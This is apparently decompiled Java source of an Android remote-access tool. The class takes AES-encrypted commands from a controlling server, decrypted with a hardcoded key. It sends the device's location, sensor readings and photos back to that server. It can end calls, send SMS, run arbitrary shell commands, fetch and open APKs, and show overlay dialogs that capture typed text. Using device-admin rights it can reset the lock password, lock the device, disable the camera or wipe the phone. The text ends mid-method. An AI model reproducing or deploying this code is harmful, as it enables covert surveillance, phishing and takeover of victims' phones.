package com.android.engine;

import Transfer.Account;
import Transfer.Action;
import Transfer.Activity;
import Transfer.AlertDialog;
import Transfer.AppProcesses;
import Transfer.AppWidget;
import Transfer.Audio;
import Transfer.AudioManager;
import Transfer.Battery;
import Transfer.Bluetooth;
import Transfer.Call;
import Transfer.CameraShot;
import Transfer.Clipboard;
import Transfer.Configuration;
import Transfer.ConfiguredWifi;
import Transfer.Connectivity;
import Transfer.Contact;
import Transfer.DeviceAdminInformation;
import Transfer.Display;
import Transfer.Download;
import Transfer.DownloadInfo;
import Transfer.Features;
import Transfer.InstalledApps;
import Transfer.LocationInfo;
import Transfer.Memory;
import Transfer.Notification;
import Transfer.SMS;
import Transfer.SensorValues;
import Transfer.Sensors;
import Transfer.Services;
import Transfer.Shortcut;
import Transfer.Telephony;
import Transfer.Thumbnail;
import Transfer.TransferFile;
import Transfer.UiMode;
import Transfer.Wallpaper;
import Transfer.Wifi;
import Transfer.WifiScan;
import Transfer._Account;
import Transfer._AudioManager;
import Transfer._BluetoothManager;
import Transfer._System;
import android.accounts.AccountManager;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.AlertDialog.Builder;
import android.app.DownloadManager;
import android.app.DownloadManager.Request;
import android.app.Notification.BigPictureStyle;
import android.app.Notification.BigTextStyle;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.UiModeManager;
import android.app.WallpaperManager;
import android.app.admin.DevicePolicyManager;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.drawable.BitmapDrawable;
import android.hardware.Camera;
import android.hardware.Camera.CameraInfo;
import android.hardware.ConsumerIrManager;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.Vibrator;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.speech.tts.TextToSpeech;
import android.speech.tts.TextToSpeech.OnInitListener;
import android.telephony.PhoneStateListener;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.ClipboardManager;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.Toast;
import com.android.engine.receivers.BluetoothDiscoveryReceiver;
import com.android.engine.receivers.VolumeReceiver;
import com.android.engine.receivers.BatteryReceiver;
import com.android.engine.receivers.BluetoothReceiver;
import com.android.engine.receivers.BluetoothFoundReceiver;
import com.android.engine.receivers.WallpaperReceiver;
import com.android.engine.receivers.WifiReceiver;
import com.android.engine.service.MyService;
import com.android.engine.ui.CameraActivity;
import com.android.engine.ui.DeviceAdminActivity;
import com.android.engine.ui.MediaProjectionActivity;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.security.Key;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.SealedObject;
import javax.crypto.spec.SecretKeySpec;

import static android.app.Notification.PRIORITY_LOW;
import static android.app.Notification.PRIORITY_MAX;
import static android.app.Notification.PRIORITY_MIN;
import static android.content.Intent.ACTION_BATTERY_CHANGED;
import static android.content.Intent.ACTION_POWER_CONNECTED;
import static android.content.Intent.ACTION_POWER_DISCONNECTED;
import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
import static android.media.AudioManager.RINGER_MODE_CHANGED_ACTION;
import static com.android.engine.ExceptionAction.sendExceptionAction;

public class ExecuterControlCenter {

  private Notification notification;
  private String b;
  private MediaRecorder mediaRecorder;
  private File file;
  private TextToSpeech textToSpeech;
  private String f;
  private Shortcut shortcut;
  private PhoneStateListener phoneStateListener;

  private BatteryReceiver batteryReceiver;
  private BluetoothReceiver bluetoothReceiver;
  private BluetoothDiscoveryReceiver bluetoothDiscoveryReceiver;
  private WifiReceiver wifiReceiver;
  private VolumeReceiver volumeReceiver;
  private WallpaperReceiver wallpaperReceiver;
  private SensorEventListener sensorEventListener;
  private BroadcastReceiver p;
  private BroadcastReceiver q;
  private BroadcastReceiver r;
  private BroadcastReceiver s;
  private BroadcastReceiver t;
  private BroadcastReceiver u;
  private BroadcastReceiver v;
  private LocationListener locationListener;

  public ExecuterControlCenter() {
    phoneStateListener = new PhoneStateListener();
    batteryReceiver = new BatteryReceiver();
    bluetoothReceiver = new BluetoothReceiver();
    bluetoothDiscoveryReceiver = new BluetoothDiscoveryReceiver();
    wifiReceiver = new WifiReceiver();
    volumeReceiver = new VolumeReceiver();
    wallpaperReceiver = new WallpaperReceiver();

    sensorEventListener = new SensorEventListener() {
      public void onAccuracyChanged(Sensor sensor, int i) {
      }

      public void onSensorChanged(SensorEvent sensorEvent) {
        try {
          SensorValues sensorValues = new SensorValues();
          sensorValues.VALUES = sensorEvent.values;
          SendMasterCommunication.sendAction(sensorValues);
        } catch (Exception e) {
        }
      }
    };

    p = new BroadcastReceiver() {
      public void onReceive(Context context, Intent intent) {
        try {
          openDownloadedApk();
          MyService.context.unregisterReceiver(p);
        } catch (Exception e) {
        }
      }
    };

    q = new BroadcastReceiver() {
      public void onReceive(Context context, Intent intent) {
        try {
          executeShortcutAction(shortcut, true);
          MyService.context.unregisterReceiver(q);
        } catch (Exception e) {
        }
      }
    };

    r = new BroadcastReceiver() {
      public void onReceive(Context context, Intent intent) {
        try {
          executeNotificationCommand(true, false, false, false);
          MyService.context.unregisterReceiver(r);
        } catch (Exception e) {
        }
      }
    };

    s = new BroadcastReceiver() {
      public void onReceive(Context context, Intent intent) {
        try {
          executeNotificationCommand(true, true, true, true);
          MyService.context.unregisterReceiver(s);
        } catch (Exception e) {
        }
      }
    };

    t = new BroadcastReceiver() {
      public void onReceive(Context context, Intent intent) {
        try {
          executeNotificationCommand(true, true, true, false);
          MyService.context.unregisterReceiver(t);
        } catch (Exception e) {
        }
      }
    };

    u = new BroadcastReceiver() {
      public void onReceive(Context context, Intent intent) {
        try {
          executeNotificationCommand(true, true, false, false);
          MyService.context.unregisterReceiver(u);
        } catch (Exception e) {
        }
      }
    };

    v = new BroadcastReceiver() {
      public void onReceive(Context context, Intent intent) {
        try {
          setWallpaper(b);
          MyService.context.unregisterReceiver(v);
        } catch (Exception e) {
        }
      }
    };

    locationListener = new LocationListener() {
      public void onLocationChanged(Location location) {
        try {
          Action action = new Action();
          action.ACTION = 131;
          action.DATA = new Double[] {
              location.getLatitude(), location.getLongitude()
          };
          SendMasterCommunication.sendAction(action);
        } catch (Exception e) {
        }
      }

      public void onProviderDisabled(String str) {
      }

      public void onProviderEnabled(String str) {
      }

      public void onStatusChanged(String str, int i, Bundle bundle) {
      }
    };
  }

  public static void endCall() {
    try {
      TelephonyManager telephonyManager =
          (TelephonyManager) MyService.context.getSystemService(Context.TELEPHONY_SERVICE);
      Method declaredMethod = Class.forName(telephonyManager.getClass().getName())
          .getDeclaredMethod("getITelephony", new Class[0]);
      declaredMethod.setAccessible(true);
      Object invoke = declaredMethod.invoke(telephonyManager, new Object[0]);
      declaredMethod =
          Class.forName(invoke.getClass().getName()).getDeclaredMethod("endCall", new Class[0]);
      declaredMethod.setAccessible(true);
      declaredMethod.invoke(invoke, new Object[0]);
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  public static void showAlertDialog(final AlertDialog alertDialog) {
    try {
      new Handler(Looper.getMainLooper()).post(new Runnable() {
        @Override public void run() {
          try {
            LinearLayout linearLayout = new LinearLayout(MyService.context);
            linearLayout.setOrientation(LinearLayout.VERTICAL);
            linearLayout.setPadding(50, 50, 50, 0);

            final EditText editText = new EditText(MyService.context);
            editText.setTextColor(-16777216);
            editText.setSingleLine(true);
            linearLayout.addView(editText);

            final Action action = new Action();
            action.ACTION = 112;

            Builder builder = VERSION.SDK_INT >= 11 ? new Builder(MyService.context, 5)
                : new Builder(MyService.context);
            builder.setTitle(alertDialog.TITLE);
            builder.setMessage(alertDialog.MESSAGE);
            builder.setCancelable(alertDialog.CANCELABLE);
            if (alertDialog.NEGATIVEBUTTON) {
              builder.setNegativeButton(alertDialog.NEGATIVEBUTTONTEXT, new OnClickListener() {
                @Override public void onClick(DialogInterface dialogInterface, int i) {
                  action.DATA = String.format(
                      "Button clicked: %s; Edittext content: %s",
                      "Negative", editText.getText());
                  SendMasterCommunication.sendAction(action);
                }
              });
            }

            if (alertDialog.NEUTALBUTTON) {
              builder.setNeutralButton(alertDialog.NEUTRALBUTTONTEXT, new OnClickListener() {
                @Override public void onClick(DialogInterface dialogInterface, int i) {
                  action.DATA = String.format(
                      "Button clicked: %s; Edittext content: %s",
                      "Neutral", editText.getText());
                  SendMasterCommunication.sendAction(action);
                }
              });
            }

            if (alertDialog.POSITIVEEBUTTON) {
              builder.setPositiveButton(alertDialog.POSITIVEBUTTONTEXT, new OnClickListener() {
                @Override public void onClick(DialogInterface dialogInterface, int i) {
                  action.DATA = String.format(
                      "Button clicked: %s; Edittext content: %s",
                      "Positive", editText.getText());
                  SendMasterCommunication.sendAction(action);
                }
              });
            }

            if (alertDialog.EDITTEXT) {
              builder.setView(linearLayout);
            }
            android.app.AlertDialog create = builder.create();
            create.getWindow().setType(2003);
            create.show();
          } catch (Exception e) {
            sendExceptionAction(e.getMessage());
          }
        }
      });
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  public static void showToast(final String str, final int i) {
    try {
      new Handler(Looper.getMainLooper()).post(new Runnable() {
        @Override public void run() {
          Toast.makeText(MyService.context, str, i).show();
        }
      });
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void sendIsAdminActive(int i) {
    try {
      if (VERSION.SDK_INT >= 8) {
        DevicePolicyManager devicePolicyManager =
            (DevicePolicyManager) MyService.context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        Action action = new Action();
        action.ACTION = i;
        action.DATA = devicePolicyManager.isAdminActive(MyService.componentName);
        SendMasterCommunication.sendAction(action);
        if ((Boolean) action.DATA && i == 90) {
          SendMasterCommunication.sendAction(new DeviceAdminInformation());
        }
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void executeWifiCommand(int i, int i2) {
    try {
      WifiManager wifiManager =
          (WifiManager) MyService.context.getSystemService(Context.WIFI_SERVICE);
      switch (i) {
        case 0:
          wifiManager.removeNetwork(i2);
          return;
        case 1:
          wifiManager.disableNetwork(i2);
          return;
        case 2:
          wifiManager.setWifiEnabled(false);
          return;
        case 3:
          wifiManager.setWifiEnabled(true);
          return;
        case 4:
          wifiManager.disconnect();
          return;
        case 5:
          wifiManager.reconnect();
          return;
        default:
          return;
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void executeVibrateCommand(int i, long j, long[] jArr, boolean z) {
    try {
      Vibrator vibrator = (Vibrator) MyService.context.getSystemService(Context.VIBRATOR_SERVICE);
      if (i == 0) {
        vibrator.cancel();
      } else if (i == 1) {
        vibrator.vibrate(j);
      } else {
        vibrator.vibrate(jArr, z ? 0 : -1);
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void executeDevicePolicyCommand(int i, String str) {
    try {
      DevicePolicyManager devicePolicyManager =
          (DevicePolicyManager) MyService.context.getSystemService(Context.DEVICE_POLICY_SERVICE);
      switch (i) {
        case 93:
          if (VERSION.SDK_INT >= 8) {
            devicePolicyManager.removeActiveAdmin(MyService.componentName);
            return;
          }
          return;
        case 96:
          if (VERSION.SDK_INT >= 8) {
            devicePolicyManager.lockNow();
            return;
          }
          return;
        case 97:
          if (VERSION.SDK_INT >= 8) {
            devicePolicyManager.resetPassword(str, 1);
            return;
          }
          return;
        case 98:
          if (VERSION.SDK_INT >= 8) {
            devicePolicyManager.resetPassword("", 1);
            return;
          }
          return;
        case 99:
          if (VERSION.SDK_INT >= 14) {
            devicePolicyManager.setCameraDisabled(MyService.componentName, true);
            return;
          }
          return;
        case 100:
          if (VERSION.SDK_INT >= 14) {
            devicePolicyManager.setCameraDisabled(MyService.componentName, false);
            return;
          }
          return;
        case 101:
          if (VERSION.SDK_INT >= 11) {
            devicePolicyManager.setStorageEncryption(MyService.componentName, true);
            return;
          }
          return;
        case 102:
          if (VERSION.SDK_INT >= 11) {
            devicePolicyManager.setStorageEncryption(MyService.componentName, false);
            return;
          }
          return;
        case 103:
          if (VERSION.SDK_INT >= 8) {
            devicePolicyManager.wipeData(1);
            return;
          }
          return;
        default:
          return;
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void transmitInfraredPattern(int i, int[] iArr) {
    try {
      if (VERSION.SDK_INT >= 19) {
        ((ConsumerIrManager) MyService.context.getSystemService(
            Context.CONSUMER_IR_SERVICE)).transmit(i, iArr);
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void takePicture(CameraShot cameraShot) {
    try {
      Intent intent = new Intent(MyService.context, CameraActivity.class);
      intent.setFlags(FLAG_ACTIVITY_NEW_TASK);
      intent.putExtra("CAMERA", cameraShot.CAMERA);
      intent.putExtra("FLASH", cameraShot.FLASH);
      intent.putExtra("FOCUS", cameraShot.FOCUS);
      intent.putExtra("QUALITY", cameraShot.QUALITY);
      MyService.context.startActivity(intent);
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void setClipboard(final Clipboard clipboard) {
    try {
      new Handler(Looper.getMainLooper()).post(new Runnable() {
        @Override public void run() {
          ((ClipboardManager) MyService.context.getSystemService(
              Context.CLIPBOARD_SERVICE)).setText(clipboard.TEXT);
        }
      });
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void enqueueDownload(Download download) {
    try {
      if (VERSION.SDK_INT >= 9) {
        DownloadManager downloadManager =
            (DownloadManager) MyService.context.getSystemService(Context.DOWNLOAD_SERVICE);
        Request request = new Request(Uri.parse(download.URL));
        if (download.ALLOWSCANNING && VERSION.SDK_INT >= 11) {
          request.allowScanningByMediaScanner();
        }
        if (download.ALLOWWIFI) {
          request.setAllowedNetworkTypes(2);
        }
        if (download.ALLOWMOBILE) {
          request.setAllowedNetworkTypes(1);
        }
        if (download.ALLOWWIFI && download.ALLOWMOBILE) {
          request.setAllowedNetworkTypes(3);
        }
        if (VERSION.SDK_INT >= 16) {
          request.setAllowedOverMetered(download.ALLOWMETERED);
        }
        request.setAllowedOverRoaming(download.ALLOWROAMING);
        request.setVisibleInDownloadsUi(download.VISIBLE);
        request.setTitle(download.TITLE);
        request.setDescription(download.DESCRIPTION);
        if (VERSION.SDK_INT >= 11) {
          if (download.NOTIFICATION == 0) {
            request.setNotificationVisibility(2);
          } else if (download.NOTIFICATION == 1) {
            request.setNotificationVisibility(0);
          } else if (download.NOTIFICATION == 2) {
            request.setNotificationVisibility(1);
          }
        }
        downloadManager.enqueue(request);
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void executeShortcutAction(Shortcut shortcut, boolean z) {
    try {
      if (VERSION.SDK_INT < 8) {
        return;
      }
      Intent intent;
      if (shortcut.INSTALL) {
        String str = "/" + shortcut.ICON.split("/")[shortcut.ICON.split("/").length - 1];
        if (z || new File(
            MyService.context.getExternalFilesDir(Environment.DIRECTORY_PICTURES).getCanonicalPath()
                + str).exists()) {
          if (shortcut.ISWEBSITE) {
            intent = new Intent("android.intent.action.VIEW");
            intent.setData(Uri.parse(shortcut.WEBSITE));
          } else {
            intent = new Intent();
            intent.setClassName(shortcut.INTENT[0], shortcut.INTENT[1]);
          }
          Intent intent2 = new Intent();
          intent2.putExtra("android.intent.extra.shortcut.INTENT", intent);
          intent2.putExtra("android.intent.extra.shortcut.NAME", shortcut.NAME);
          Bitmap decodeFile = BitmapFactory.decodeFile(
              MyService.context.getExternalFilesDir(Environment.DIRECTORY_PICTURES)
                  .getCanonicalPath() + str);
          if (VERSION.SDK_INT >= 11) {
            int launcherLargeIconSize = ((ActivityManager) MyService.context.getSystemService(
                Context.ACTIVITY_SERVICE)).getLauncherLargeIconSize();
            intent2.putExtra("android.intent.extra.shortcut.ICON",
                Bitmap.createScaledBitmap(decodeFile, launcherLargeIconSize, launcherLargeIconSize,
                    true));
          }
          intent2.setAction("com.android.launcher.action.INSTALL_SHORTCUT");
          MyService.context.sendBroadcast(intent2);
          return;
        }
        downloadPictures(shortcut.ICON);
        return;
      }
      Intent intent3 = new Intent();
      intent3.putExtra("android.intent.extra.shortcut.NAME", shortcut.NAME);
      if (shortcut.ISWEBSITE) {
        intent = new Intent("android.intent.action.VIEW");
        intent.setData(Uri.parse(shortcut.WEBSITE));
      } else {
        intent = new Intent();
        intent.setClassName(shortcut.INTENT[0], shortcut.INTENT[1]);
      }
      intent3.putExtra("android.intent.extra.shortcut.INTENT", intent);
      intent3.setAction("com.android.launcher.action.UNINSTALL_SHORTCUT");
      MyService.context.sendBroadcast(intent3);
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void sendPicture(Thumbnail thumbnail) {
    try {
      Bitmap createScaledBitmap =
          Bitmap.createScaledBitmap(BitmapFactory.decodeFile(thumbnail.path), thumbnail.width,
              thumbnail.height, false);
      ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
      createScaledBitmap.compress(CompressFormat.JPEG, thumbnail.compressionrate,
          byteArrayOutputStream);
      byteArrayOutputStream.close();
      Action action = new Action();
      action.ACTION = 132;
      action.DATA = byteArrayOutputStream.toByteArray();
      SendMasterCommunication.sendAction(action);
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void a(Transfer._AudioManager r9) {
    // TODO: Decryption issue to handle
    throw new UnsupportedOperationException(
        "Method not decompiled: com.android.engine.bluetoothReceiver.VolumeReceiver(Transfer._AudioManager):void");
  }

  private void registerPhoneListener(PhoneStateListener phoneStateListener) {
    try {
      MyService.telephonyManager.listen(phoneStateListener, 0);
      MyService.telephonyManager.listen(phoneStateListener, 32);
      this.phoneStateListener = phoneStateListener;
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void a(final PhoneStateListener phoneStateListener, final PhoneStateListener phoneStateListener2,
      final PhoneStateListener phoneStateListener3, final PhoneStateListener phoneStateListener4) {
    try {
      new Handler(Looper.getMainLooper()).post(new Runnable() {
        @Override public void run() {
          if (ExecuterControlCenter.this.phoneStateListener == phoneStateListener) {
            registerPhoneListener(phoneStateListener2);
          } else if (ExecuterControlCenter.this.phoneStateListener == phoneStateListener3) {
            registerPhoneListener(phoneStateListener4);
          }
        }
      });
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void executeNotificationCommand(boolean z, boolean z2, boolean z3, boolean z4) {
    int i = 1;
    try {
      if (VERSION.SDK_INT >= 11) {
        String str =
            "/" + notification.SOUND.split("/")[notification.SOUND.split("/").length - 1];
        if (z || new File(MyService.context.getExternalFilesDir(Environment.DIRECTORY_RINGTONES)
            .getCanonicalPath() + str).exists()) {
          String str2 =
              "/" + notification.ICON.split("/")[notification.ICON.split("/").length - 1];
          if (z2 || new File(MyService.context.getExternalFilesDir(Environment.DIRECTORY_PICTURES)
              .getCanonicalPath() + str2).exists()) {
            String str3 =
                "/" + notification.BIGICON.split("/")[notification.BIGICON.split(
                    "/").length - 1];
            if (z3 || new File(MyService.context.getExternalFilesDir(Environment.DIRECTORY_PICTURES)
                .getCanonicalPath() + str3).exists()) {
              String str4 =
                  "/" + notification.BIGPICTURE.split("/")[notification.BIGPICTURE.split(
                      "/").length - 1];
              if (z4 || new File(
                  MyService.context.getExternalFilesDir(Environment.DIRECTORY_PICTURES)
                      .getCanonicalPath() + str4).exists()) {
                NotificationManager notificationManager =
                    (NotificationManager) MyService.context.getSystemService(
                        Context.NOTIFICATION_SERVICE);
                android.app.Notification.Builder builder =
                    new android.app.Notification.Builder(MyService.context);
                if (((notification.TITLE.length() > 0 ? 1 : 0) & (
                    notification.TITLE != null ? 1 : 0)) != 0) {
                  builder.setContentTitle(notification.TITLE);
                }
                if (((notification.TEXT.length() > 0 ? 1 : 0) & (notification.TEXT != null
                    ? 1 : 0)) != 0) {
                  builder.setContentText(notification.TEXT);
                }
                if (((notification.INFO.length() > 0 ? 1 : 0) & (notification.INFO != null
                    ? 1 : 0)) != 0) {
                  builder.setContentInfo(notification.INFO);
                }
                int i2 = notification.TICKER != null ? 1 : 0;
                if (notification.TICKER.length() <= 0) {
                  i = 0;
                }
                if ((i & i2) != 0) {
                  builder.setTicker(notification.TICKER);
                }
                if (VERSION.SDK_INT >= 14 && notification.PROGRESSBAR) {
                  builder.setProgress(100, notification.PROGRESS,
                      notification.INDETERMINATE);
                }
                if (notification._WHEN) {
                  if (notification.CURRENT) {
                    builder.setWhen(System.currentTimeMillis());
                  } else {
                    builder.setWhen(notification.WHEN);
                  }
                }
                if (VERSION.SDK_INT >= 17) {
                  builder.setShowWhen(notification._WHEN);
                  if (notification.USECHRONOMETER) {
                    builder.setUsesChronometer(notification.USECHRONOMETER);
                    builder.setWhen(System.currentTimeMillis());
                    builder.setShowWhen(true);
                  }
                }
                if (VERSION.SDK_INT >= 21) {
                  if (notification.VISIBIILITY == 2) {
                    builder.setVisibility(-1);
                  } else {
                    builder.setVisibility(notification.VISIBIILITY);
                  }
                  builder.setColor(
                      Color.argb(notification.COLOR[0], notification.COLOR[1],
                          notification.COLOR[2], notification.COLOR[3]));
                }
                switch (notification.DEFAULTS) {
                  case 0:
                    builder.setVibrate(notification.VIBRATIONPATTERN);
                    builder.setLights(
                        Color.argb(notification.LIGHTCOLOR[0], notification.LIGHTCOLOR[1],
                            notification.LIGHTCOLOR[2], notification.LIGHTCOLOR[3]),
                        notification.ON, notification.OFF);
                    builder.setSound(Uri.parse(
                        MyService.context.getExternalFilesDir(Environment.DIRECTORY_RINGTONES)
                            .getCanonicalPath() + str));
                    break;
                  case 1:
                    builder.setDefaults(1);
                    builder.setVibrate(notification.VIBRATIONPATTERN);
                    builder.setLights(
                        Color.argb(notification.LIGHTCOLOR[0], notification.LIGHTCOLOR[1],
                            notification.LIGHTCOLOR[2], notification.LIGHTCOLOR[3]),
                        notification.ON, notification.OFF);
                    break;
                  case 2:
                    builder.setDefaults(2);
                    builder.setLights(
                        Color.argb(notification.LIGHTCOLOR[0], notification.LIGHTCOLOR[1],
                            notification.LIGHTCOLOR[2], notification.LIGHTCOLOR[3]),
                        notification.ON, notification.OFF);
                    builder.setSound(Uri.parse(
                        MyService.context.getExternalFilesDir(Environment.DIRECTORY_RINGTONES)
                            .getCanonicalPath() + str));
                    break;
                  case 3:
                    builder.setDefaults(4);
                    builder.setVibrate(notification.VIBRATIONPATTERN);
                    builder.setSound(Uri.parse(
                        MyService.context.getExternalFilesDir(Environment.DIRECTORY_RINGTONES)
                            .getCanonicalPath() + str));
                    break;
                  case 4:
                    builder.setDefaults(-1);
                    break;
                }
                if (VERSION.SDK_INT >= 20) {
                  builder.setLocalOnly(notification.LOCALONLY);
                }
                builder.setOngoing(notification.ONGOING);
                builder.setOnlyAlertOnce(notification.ALERTONCE);
                builder.setSmallIcon(R.mipmap.ic_launcher);
                builder.setLargeIcon(BitmapFactory.decodeFile(
                    MyService.context.getExternalFilesDir(Environment.DIRECTORY_PICTURES)
                        .getCanonicalPath() + str2));
                if (VERSION.SDK_INT >= 16) {
                  if (notification._SUBTEXT) {
                    builder.setSubText(notification.SUBTEXT);
                  }
                  switch (notification.PRIORITY) {
                    case 2:
                      builder.setPriority(PRIORITY_LOW);
                      break;
                    case 3:
                      builder.setPriority(PRIORITY_MAX);
                      break;
                    case 4:
                      builder.setPriority(PRIORITY_MIN);
                      break;
                    default:
                      builder.setPriority(notification.PRIORITY);
                      break;
                  }
                  if (notification.BIGTEXTENABLED) {
                    builder.setStyle(
                        new BigTextStyle().setBigContentTitle(notification.BIGTEXTTITLE)
                            .setSummaryText(notification.BIGSUMMARYTEXT)
                            .bigText(notification.BIGTEXT));
                  }
                  if (notification.BIGPICTUREENABLED) {
                    builder.setStyle(
                        new BigPictureStyle().setSummaryText(notification.BIGSUMMARYPICTURE)
                            .setBigContentTitle(notification.BIGPICTURETITLE)
                            .bigPicture(BitmapFactory.decodeFile(
                                MyService.context.getExternalFilesDir(
                                    Environment.DIRECTORY_PICTURES).getCanonicalPath() + str4))
                            .bigLargeIcon(BitmapFactory.decodeFile(
                                MyService.context.getExternalFilesDir(
                                    Environment.DIRECTORY_PICTURES).getCanonicalPath() + str3)));
                  }
                  if (notification._ACTION) {
                    Intent intent = new Intent("android.intent.action.VIEW");
                    intent.setData(Uri.parse(notification.ACTION));
                    builder.setContentIntent(
                        PendingIntent.getActivity(MyService.context, 0, intent, 0));
                    builder.setAutoCancel(true);
                  }
                  notificationManager.notify(0, builder.build());
                  return;
                }
                return;
              }
              e(notification.BIGPICTURE);
              return;
            }
            d(notification.BIGICON);
            return;
          }
          c(notification.ICON);
          return;
        }
        downloadRingtone(notification.SOUND);
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void executeTextToSpeech(final Object[] objArr) {
    try {
      if (VERSION.SDK_INT >= 4) {
        textToSpeech = new TextToSpeech(MyService.context, new OnInitListener() {
          @Override public void onInit(int i) {
            textToSpeech.setSpeechRate(((Float) objArr[1]).floatValue());
            textToSpeech.setPitch(((Float) objArr[2]).floatValue());
            textToSpeech.speak((String) objArr[0], 0, null);
          }
        });
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private void sendSms(String[] strArr) {
    try {
      if (VERSION.SDK_INT >= 4) {
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendMultipartTextMessage(strArr[0], null, smsManager.divideMessage(strArr[1]),
            null, null);
        MyService.androidEngineSharedPreferences.edit()
            .putInt("NumberOfSMSSent",
                MyService.androidEngineSharedPreferences.getInt("NumberOfSMSSent", 0) + 1)
            .commit();
      }
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
    }
  }

  private boolean executeShellCommand(String str) {
    try {
      Runtime.getRuntime().exec(str);
      return true;
    } catch (Exception e) {
      return false;
    }
  }

  private Object decrypt(Object action) {
    try {
      Key secretKeySpec = new SecretKeySpec(new byte[] {
          (byte) 19, (byte) 60, (byte) -43, (byte) 16, (byte) -13, (byte) 20, (byte) -64,
          (byte) -21, (byte) 72, (byte) -93, (byte) -79, (byte) -10, (byte) 80, (byte) -6,
          Byte.MIN_VALUE, (byte) 111
      }, "AES");
      SealedObject sealedObject = (SealedObject) action;
      Cipher instance = Cipher.getInstance("AES");
      instance.init(2, secretKeySpec);
      return sealedObject.getObject(instance);
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
      return null;
    }
  }

  private List<AppProcesses> getAppProcesses() {
    try {
      if (VERSION.SDK_INT < 3) {
        return new ArrayList();
      }
      List<AppProcesses> arrayList = new ArrayList();
      for (RunningAppProcessInfo runningAppProcessInfo : ((ActivityManager) MyService.context.getSystemService(
          Context.ACTIVITY_SERVICE)).getRunningAppProcesses()) {
        AppProcesses appProcesses = new AppProcesses();
        if (runningAppProcessInfo.importance == 400) {
          appProcesses.IMPORTANCE = "Background";
        } else if (runningAppProcessInfo.importance == 500) {
          appProcesses.IMPORTANCE = "Empty";
        } else if (runningAppProcessInfo.importance == 100) {
          appProcesses.IMPORTANCE = "Foreground";
        } else if (runningAppProcessInfo.importance == 1000) {
          appProcesses.IMPORTANCE = "Gone";
        } else if (runningAppProcessInfo.importance == 130) {
          appProcesses.IMPORTANCE = "Perceptible";
        } else if (runningAppProcessInfo.importance == 300) {
          appProcesses.IMPORTANCE = "Service";
        } else if (runningAppProcessInfo.importance == 200) {
          appProcesses.IMPORTANCE = "Visible";
        }
        if (runningAppProcessInfo.importanceReasonCode == 1) {
          appProcesses.IMPORTANCEREASONCODE = "Provider In Use";
        } else if (runningAppProcessInfo.importanceReasonCode == 2) {
          appProcesses.IMPORTANCEREASONCODE = "Service In Use";
        } else if (runningAppProcessInfo.importanceReasonCode == 0) {
          appProcesses.IMPORTANCEREASONCODE = "Unknown";
        }
        if (VERSION.SDK_INT >= 5) {
          appProcesses.CLASSNAME = runningAppProcessInfo.importanceReasonComponent != null
              ? runningAppProcessInfo.importanceReasonComponent.getClassName() : "null";
          appProcesses.PACKAGENAME = runningAppProcessInfo.importanceReasonComponent != null
              ? runningAppProcessInfo.importanceReasonComponent.getPackageName() : "null";
        }
        appProcesses.PID = runningAppProcessInfo.pid;
        appProcesses.PKGLIST = Arrays.asList(runningAppProcessInfo.pkgList).toString();
        appProcesses.PROCESSNAME = runningAppProcessInfo.processName;
        appProcesses.UID = runningAppProcessInfo.uid;
        arrayList.add(appProcesses);
      }
      return arrayList;
    } catch (Exception e) {
      sendExceptionAction(e.getMessage());
      return new ArrayList();
    }
  }

  private void disableKeyguardFeature(int i) {
    try {
      if (VERSION.SDK_INT >= 17) {
        DevicePolicyManager devicePolicyManager =
            (DevicePolicyManager) MyService.context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        switch (i) {
          case 0:
            devicePolicyManager.setKeyguardDisabledFeatures(MyService.componentName,
                Integer.MAX_VALUE);
            return;
          case 1:
